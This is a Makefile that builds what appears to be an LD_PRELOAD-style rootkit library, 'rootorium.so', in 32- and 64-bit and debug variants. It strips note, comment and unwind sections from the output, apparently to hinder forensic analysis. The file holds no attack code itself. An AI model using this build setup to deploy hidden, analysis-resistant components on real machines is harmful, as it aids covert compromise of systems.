#ARCH := $(shell uname -m | sed 's/i686/32/; s/x86_64/64/')
ARCH := $(uname -r | sed -e 's/i386/common/' -e 's/amd64/common/')

all: product debug

product: rootorium.so rootorium.so.i686

debug: rootorium.so.dbg rootorium.so.i686.dbg

rootorium.so: rootorium.c
	gcc -std=gnu99 -O3 -Wall -Wl,--build-id=none -pthread -ldl dlsym.c misc.c rootorium.c -o rootorium.so
	strip  -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr rootorium.so

rootorium.so.i686: rootorium.c
	gcc -m32 -std=gnu99 -O3 -Wall -Wl,--build-id=none -pthread -ldl dlsym.c misc.c rootorium.c -o rootorium.so.i686
	strip  -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr rootorium.so.i686

rootorium.so.dbg: rootorium.c
	gcc -std=gnu99 -g -DDEBUG -O0 -Wall -Wl,--build-id=none -pthread -ldl dlsym.c misc.c rootorium.c -o rootorium.so.dbg

rootorium.so.i686.dbg: rootorium.c
	gcc -m32 -std=gnu99 -g -DDEBUG -O0 -Wall -Wl,--build-id=none -pthread -ldl dlsym.c misc.c rootorium.c -o rootorium.so.i686.dbg

clean:
	rm -f rootorium.so rootorium.so.i686 rootorium.so.dbg rootorium.so.i686.dbg

distclean:
	rm -f rootorium.so rootorium.so.i686 rootorium.so.dbg rootorium.so.i686.dbg